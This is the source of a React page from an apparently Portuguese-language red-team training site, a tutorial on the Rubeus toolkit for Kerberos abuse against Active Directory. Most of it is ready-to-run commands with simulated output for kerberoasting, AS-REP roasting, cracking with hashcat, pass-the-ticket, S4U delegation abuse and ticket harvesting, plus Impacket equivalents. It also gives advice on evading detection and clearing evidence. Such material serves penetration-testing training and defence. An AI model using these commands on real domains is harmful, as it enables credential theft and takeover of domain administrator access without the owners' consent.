import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Rubeus() {
  return (
    <PageContainer
      title="Rubeus — Kerberos abuse toolkit"
      subtitle="Asktgt, asktgs, kerberoast, asreproast, S4U, PtT, ticket conversion. .NET binary executado in-memory pelo seu C2."
      difficulty="avancado"
      timeToRead="22 min"
    >
      <h2>O que é Rubeus</h2>
      <p>
        <strong>Rubeus</strong> (GhostPack/Rubeus, originalmente por Will Schroeder/@harmj0y) é o
        canivete suíço para abuso de Kerberos no lado Windows. Escrito em C#/.NET, normalmente
        executado em memória via Cobalt Strike <code>execute-assembly</code>, Sliver{" "}
        <code>execute-assembly</code>, Havoc <code>dotnet-inline</code> ou Mythic{" "}
        <code>execute_assembly</code>. No Kali, você compila uma vez e usa via C2.
      </p>

      <AlertBox type="warning" title="Rubeus é um TGS-REQ legítimo do ponto de vista do KDC">
        <p>
          Rubeus não explora vulnerabilidade nenhuma — ele apenas faz pedidos Kerberos válidos. Por isso
          é tão usado: do ponto de vista do DC, é um cliente Windows pedindo TGT/TGS normal. A detecção
          fica em padrões de comportamento (event 4769 com encryption RC4, mass requests, etc.).
        </p>
      </AlertBox>

      <h2>Compilar (uma vez, no Kali)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y mono-devel msbuild",
            out: "(precisa de .NET / mono pra compilar do source)",
            outType: "muted",
          },
          {
            cmd: "git clone https://github.com/GhostPack/Rubeus ~/tools/Rubeus",
            out: "Cloning into '/home/wallyson/tools/Rubeus'...",
            outType: "info",
          },
          {
            cmd: "cd ~/tools/Rubeus && msbuild Rubeus.sln -p:Configuration=Release",
            out: `Microsoft (R) Build Engine version 16.10.1 for Mono
Build started 4/3/2026 14:51:00.

CSC : Rubeus -> /home/wallyson/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe

Build succeeded.
    0 Warning(s)
    0 Error(s)`,
            outType: "success",
          },
          {
            comment: "alternativa: pegar pré-compilado do release oficial (assinatura conhecida AV)",
            cmd: "ls -la ~/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe",
            out: "-rw-r--r-- 1 wallyson wallyson 482304 Apr  3 14:51 Rubeus.exe",
            outType: "default",
          },
        ]}
      />

      <h2>Comandos principais</h2>
      <CommandTable
        title="Cheatsheet Rubeus"
        variations={[
          { cmd: "asktgt /user:USER /password:PASS /domain:DOMAIN", desc: "Pede TGT direto pro KDC com senha plain.", output: "Retorna .kirbi base64 — usa pra PtT depois." },
          { cmd: "asktgt /user:USER /rc4:NTLM /domain:DOMAIN", desc: "TGT usando NTLM hash (overpass-the-hash).", output: "Mais discreto que sekurlsa::pth." },
          { cmd: "asktgt /user:USER /aes256:KEY /domain:DOMAIN /opsec", desc: "TGT com AES256 — match perfeito de cliente Windows moderno.", output: "/opsec faz request idêntico ao do LSASS." },
          { cmd: "asktgs /service:SPN /ticket:TGT.kirbi", desc: "Pede TGS pra service específico usando TGT existente.", output: "Útil pra cross-realm." },
          { cmd: "kerberoast /spn:SPN /outfile:roasted.txt", desc: "Pede TGS de service accounts e exporta hash p/ crack.", output: "Hash crackável com hashcat -m 13100." },
          { cmd: "kerberoast /stats", desc: "Lista quantos SPNs / contas crackable existem.", output: "Útil para reconnaissance silencioso." },
          { cmd: "asreproast /user:USER /domain:DOMAIN", desc: "Captura AS-REP de users com 'DONT_REQUIRE_PREAUTH'.", output: "Hash crackável com hashcat -m 18200." },
          { cmd: "s4u /user:SVC /rc4:HASH /impersonateuser:Admin /msdsspn:cifs/dc01", desc: "S4U2Self + S4U2Proxy (constrained delegation).", output: "Resulta em TGS válido como Admin acessando DC." },
          { cmd: "ptt /ticket:base64.kirbi", desc: "Pass-the-ticket — injeta na current logon session.", output: "Equivalente a kerberos::ptt do Mimikatz." },
          { cmd: "describe /ticket:base64.kirbi", desc: "Decodifica e mostra conteúdo de um .kirbi.", output: "Útil pra verificar validade/Flags." },
          { cmd: "renew /ticket:base64.kirbi", desc: "Renova TGT antes do vencimento.", output: "Mantém acesso por até 7 dias default." },
          { cmd: "purge", desc: "Limpa todos os tickets da current session.", output: "OPSEC: limpe ao final pra não deixar evidência." },
          { cmd: "tgtdeleg", desc: "Tira TGT delegado da própria sessão (sem credencial).", output: "Útil pra exportar TGT do user atual silenciosamente." },
        ]}
      />

      <h2>Kerberoasting — caso de uso #1</h2>
      <p>
        Pega TGS de qualquer service account, criptografado com a senha hash da própria service account.
        Crackeia offline → senha do service → muitas vezes service account é admin de algum SQL/IIS.
      </p>

      <Terminal
        path="C:\\Tools"
        user="jsmith"
        host="WS-USR07"
        lines={[
          {
            comment: "qualquer user de domínio consegue fazer kerberoasting",
            cmd: "Rubeus.exe kerberoast /outfile:hashes.txt /nowrap",
            out: `   ______        _
  (_____ \\      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \\| ___ | | | |/___)
  | |  \\ \\| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*] Searching path 'LDAP://DC01.acme.corp/DC=acme,DC=corp' for '(&(samAccountType=805306368)(servicePrincipalName=*))'

[*] Total kerberoastable users : 6

[*] SamAccountName         : sql_svc
[*] DistinguishedName      : CN=SQL Service,CN=Users,DC=acme,DC=corp
[*] ServicePrincipalName   : MSSQLSvc/db01.acme.corp:1433
[*] PwdLastSet             : 2/14/2024 12:00:00 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*sql_svc$ACME.CORP$MSSQLSvc/db01.acme.corp:1433*$1A2B3C...

[*] SamAccountName         : iis_svc
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*iis_svc$ACME.CORP$HTTP/intranet.acme.corp*$4D5E6F...`,
            outType: "warning",
          },
          {
            comment: "no Kali — crack",
            cmd: "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -O",
            out: `$krb5tgs$23$*sql_svc$ACME.CORP$...:Summer2024!
$krb5tgs$23$*iis_svc$ACME.CORP$...:Welcome@Acme1`,
            outType: "success",
          },
        ]}
      />

      <h3>OPSEC: kerberoast TARGETED</h3>
      <CodeBlock
        language="bash"
        title="alvo único + sem RC4 forçado"
        code={`# default do Rubeus força RC4 (event 4769 com etype 0x17 = sinal vermelho)
# em ambientes maduros use:
Rubeus.exe kerberoast \\
  /user:sql_svc \\
  /domain:acme.corp \\
  /dc:dc01.acme.corp \\
  /aes \\
  /outfile:roasted.txt

# /aes = só pega contas com AES habilitado (menos detectável)
# alternativa: /tgtdeleg (usa TGT delegado, sem nova autenticação)

Rubeus.exe kerberoast /tgtdeleg /spn:MSSQLSvc/db01.acme.corp /nowrap`}
      />

      <h2>AS-REP Roasting</h2>
      <p>
        Quando uma conta tem flag <code>DONT_REQ_PREAUTH</code>, qualquer um pode pedir AS-REP sem provar
        identidade — e o AS-REP vem criptografado com a senha do user. Crackeável offline.
      </p>

      <Terminal
        path="C:\\Tools"
        user="jsmith"
        host="WS-USR07"
        lines={[
          {
            comment: "primeiro: encontrar alvos com PowerView ou ldapsearch",
            cmd: "Rubeus.exe asreproast /domain:acme.corp /format:hashcat /outfile:asrep.txt",
            out: `[*] Action: AS-REP roasting

[*] Target Domain          : acme.corp

[*] SamAccountName         : legacy_admin
[*] DistinguishedName      : CN=Legacy Admin,CN=Users,DC=acme,DC=corp
[*] Using domain controller: dc01.acme.corp (10.10.10.5)
[*] Building AS-REQ (w/o preauth) for: 'acme.corp\\legacy_admin'
[+] AS-REQ w/o preauth successful!
[*] Hash written to asrep.txt

$krb5asrep$23$legacy_admin@ACME.CORP:b8a9c4d2...$2f1e3a4b...`,
            outType: "warning",
          },
          {
            comment: "no Kali — crack",
            cmd: "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -O",
            out: `$krb5asrep$23$legacy_admin@ACME.CORP:...:Password123`,
            outType: "success",
          },
        ]}
      />

      <h2>Pass-the-Ticket fluxo completo</h2>
      <Terminal
        path="C:\\Tools"
        user="jsmith"
        host="WS-USR07"
        lines={[
          {
            comment: "pega TGT do user atual com senha conhecida",
            cmd: "Rubeus.exe asktgt /user:Administrator /password:Pass!2026 /domain:acme.corp /nowrap",
            out: `[*] Action: Ask TGT

[*] Using rc4_hmac hash: 88846F7EAEE8FB117AD06BDD830B7586
[*] Building AS-REQ (w/ preauth) for: 'acme.corp\\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFGjCCBRagAwIBBaEDAgEWooIEKzCCBCdhggQjMIIEH6ADAgEFoQobC1RFU1Q...

  ServiceName              :  krbtgt/acme.corp
  ServiceRealm             :  ACME.CORP
  UserName                 :  Administrator
  StartTime                :  4/3/2026 9:11:01 AM
  EndTime                  :  4/3/2026 7:11:01 PM
  RenewTill                :  4/10/2026 9:11:01 AM
  KeyType                  :  rc4_hmac
  Base64(key)              :  IVrHIqhXt/TcfL9bO7Hdsg==`,
            outType: "info",
          },
          {
            comment: "injeta o TGT na sessão atual (PtT)",
            cmd: "Rubeus.exe ptt /ticket:doIFGjCCBRagAwIBBaEDAgEWooIEKzCCBCdhggQjMIIE...",
            out: `[*] Action: Import Ticket
[+] Ticket successfully imported!`,
            outType: "success",
          },
          {
            comment: "valida com klist",
            cmd: "klist",
            out: `Cached Tickets: (1)
#0> Client: Administrator @ ACME.CORP
    Server: krbtgt/ACME.CORP @ ACME.CORP
    KerbTicket Encryption Type: RC4-HMAC`,
            outType: "warning",
          },
          {
            cmd: "dir \\\\dc01.acme.corp\\c$",
            out: " Volume in drive \\\\dc01.acme.corp\\c$\n Directory of \\\\dc01.acme.corp\\c$\n01/14/2025  10:22 AM    <DIR>          Users",
            outType: "success",
          },
        ]}
      />

      <h2>S4U attack — abusing constrained delegation</h2>
      <CodeBlock
        language="bash"
        title="pré-requisito: você comprometeu uma service account com S4U2Proxy delegation"
        code={`# cenário: 'webapp_svc' tem permissão de delegação para CIFS/dc01.acme.corp
# (i.e. consegue impersonar qualquer user nesse SPN específico)

# 1) pegar TGT do webapp_svc (você tem o NTLM dele)
Rubeus.exe asktgt /user:webapp_svc /rc4:E2A4B5C6D7E8F9... /domain:acme.corp /nowrap

# 2) S4U2Self: pede TGS pra ele mesmo, mas em nome do Administrator
# 3) S4U2Proxy: usa esse TGS pra pedir TGS de CIFS/dc01.acme.corp como Administrator
Rubeus.exe s4u \\
  /user:webapp_svc \\
  /rc4:E2A4B5C6D7E8F9... \\
  /impersonateuser:Administrator \\
  /msdsspn:cifs/dc01.acme.corp \\
  /altservice:cifs/dc01.acme.corp,host/dc01.acme.corp,http/dc01.acme.corp \\
  /domain:acme.corp \\
  /ptt

# resultado: você tem TGS válido para CIFS/dc01.acme.corp como Administrator
# mesmo nunca tendo a senha do Administrator!
dir \\\\dc01.acme.corp\\c$
# (acesso liberado)`}
      />

      <h2>Unconstrained delegation abuse</h2>
      <Terminal
        path="C:\\Tools"
        user="SYSTEM"
        host="WEB01"
        lines={[
          {
            comment: "se você comprometeu uma máquina com Unconstrained Delegation, qualquer TGT é seu",
            cmd: "Rubeus.exe monitor /interval:5 /nowrap",
            out: `[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 4/3/2026 14:52:11 UTC - Found new TGT:

  User                  :  Administrator@ACME.CORP
  StartTime             :  4/3/2026 14:52:11
  EndTime               :  4/4/2026 0:52:11
  RenewTill             :  4/10/2026 14:52:11
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFnDCCBZigAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoQobC1RFU1Q...`,
            outType: "warning",
          },
          {
            comment: "agora basta um Domain Admin acessar essa máquina (printer bug, coercion via PetitPotam)",
            cmd: "Rubeus.exe ptt /ticket:doIFnDCCBZigAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoQob...",
            out: "[+] Ticket successfully imported!",
            outType: "success",
          },
        ]}
      />

      <h2>Equivalentes Linux-side (Impacket)</h2>
      <CodeBlock
        language="bash"
        title="quando você só tem Kali — sem precisar do Rubeus"
        code={`# Kerberoasting sem Rubeus
impacket-GetUserSPNs acme.corp/jsmith:'Pass!2026' -dc-ip 10.10.10.5 -request -outputfile roasted.txt

# AS-REP Roasting
impacket-GetNPUsers acme.corp/ -usersfile users.txt -no-pass -dc-ip 10.10.10.5 -outputfile asrep.txt

# obter TGT (asktgt)
impacket-getTGT acme.corp/Administrator:'Pass!2026' -dc-ip 10.10.10.5
# salva Administrator.ccache

# usar ccache (equivalente ao PtT)
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass acme.corp/Administrator@dc01.acme.corp

# S4U attack
impacket-getST -spn cifs/dc01.acme.corp -impersonate Administrator -dc-ip 10.10.10.5 acme.corp/webapp_svc:Pass

# converter .kirbi <-> ccache
impacket-ticketConverter Administrator.ccache Administrator.kirbi
impacket-ticketConverter Administrator.kirbi Administrator.ccache`}
      />

      <h2>Detecção (o que blue team vê)</h2>
      <CommandTable
        title="Eventos no DC que você quer evitar"
        variations={[
          { cmd: "Event 4769 (TGS request)", desc: "Toda vez que Rubeus pede TGS — kerberoast gera N desses.", output: "Filtra por TicketEncryptionType=0x17 (RC4)." },
          { cmd: "Event 4768 (TGT request)", desc: "AS-REQ — asktgt gera 1 por execução.", output: "Sem preauth (asreproast) é suspeito." },
          { cmd: "Event 4624 logon type 3", desc: "Network logon usando TGT importado (PtT).", output: "Compara workstation source vs TGT user." },
          { cmd: "Pattern: alta volume de 4769 RC4", desc: "Kerberoast de massa.", output: "Alerta SIEM clássico." },
          { cmd: "Bug 'silver ticket no 4769'", desc: "Silver ticket NÃO gera 4769 no DC.", output: "Por isso é o ataque mais discreto." },
          { cmd: "Honey SPN", desc: "Service account fake só pra chamar Kerberoast.", output: "Se alguém pedir TGS dela = alerta imediato." },
        ]}
      />

      <PracticeBox
        title="Lab: rodar Rubeus em VM Windows e fazer kerberoast num lab AD"
        goal="Validar fluxo completo: compilar Rubeus, rodar kerberoast num AD lab (ex: GOAD), crackear no Kali."
        steps={[
          "Compile o Rubeus.exe no Kali com msbuild.",
          "Suba o lab GOAD ou use HTB Active Directory.",
          "Copie o Rubeus.exe pra VM Windows do user do domínio.",
          "Rode `Rubeus.exe kerberoast /outfile:r.txt /nowrap`.",
          "Transfira r.txt para o Kali.",
          "Crackeie com hashcat -m 13100.",
        ]}
        command={`# no Kali:
cd ~/tools/Rubeus
msbuild Rubeus.sln -p:Configuration=Release

# upload pra VM Windows alvo (via SMB do user do domínio)
impacket-smbserver share . -smb2support
# da VM windows: net use Z: \\\\KALI\\share && copy Z:\\Rubeus.exe C:\\Tools\\

# na VM windows (logado como user do domínio)
C:\\Tools\\Rubeus.exe kerberoast /outfile:C:\\Tools\\r.txt /nowrap

# de volta no Kali
hashcat -m 13100 r.txt /usr/share/wordlists/rockyou.txt -O`}
        expected={`[*] Total kerberoastable users : 3
[*] SamAccountName : sql_svc
[*] Hash : $krb5tgs$23$*sql_svc$LAB.LOCAL$MSSQLSvc/db01.lab.local*$1A2B...

(no hashcat:)
$krb5tgs$23$*sql_svc$LAB.LOCAL$...:Summer2024!
Recovered........: 1/3 (33.33%) Digests`}
        verify="O hashcat deve recuperar pelo menos 1 senha (depende da força das senhas no lab). Se nada veio, use rules: -r OneRuleToRuleThemAll.rule."
      />

      <AlertBox type="info" title="Rubeus + BloodHound = workflow padrão Red Team AD">
        <p>
          O fluxo profissional de 2026 é: <strong>SharpHound</strong> coleta → <strong>BloodHound</strong>{" "}
          mostra path "Owned User → DA via Kerberoast" → <strong>Rubeus</strong> kerberoast/asreproast
          executa via C2 → <strong>hashcat</strong> cracka offline → <strong>Rubeus ptt / Impacket</strong>{" "}
          usa o ticket. Domine os 4 e você cobre 80% dos engagements internos AD.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
